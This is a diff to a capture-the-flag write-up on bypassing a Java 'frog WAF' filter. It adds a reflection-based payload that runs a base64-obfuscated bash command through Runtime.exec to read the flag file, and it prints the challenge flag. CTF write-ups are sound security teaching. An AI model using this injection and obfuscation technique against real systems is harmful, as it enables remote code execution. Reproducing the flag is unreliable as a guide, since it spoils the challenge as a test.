@@ -134,7 +134,7 @@ public enum AttackTypes {
 }
 ```
 
-the issue mainly are quotes and numbers, so strings must be build using their char points at runtime. looking at the filter you can see that arrays are allowed. 
+the issue mainly are quotes and numbers, so strings must be built using their char points at runtime. looking at the filter you can see that arrays are allowed. 
 
 ![array toString](assets/array.png)
 
@@ -187,7 +187,11 @@ r = HTTP.post(url, json: {"firstName": "test", "lastName": "test", "description"
 puts r
 ```
 
+which produces roughly (via reflection):
+```java
+Base64.getEncoder().encodeToString([].getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {echo,Y2F0IC9mbGFnLSoudHh0}|{base64,-d}|{bash,-i}").getInputStream().readAllBytes())
+```
+
 ![solver.rb](assets/solver.png)
 
-flag: `SEKAI{0h_w0w_y0u_r34lly_b34t_fr0g_wAf_c0ngr4ts!!!!}
-`
+flag: `SEKAI{0h_w0w_y0u_r34lly_b34t_fr0g_wAf_c0ngr4ts!!!!}`
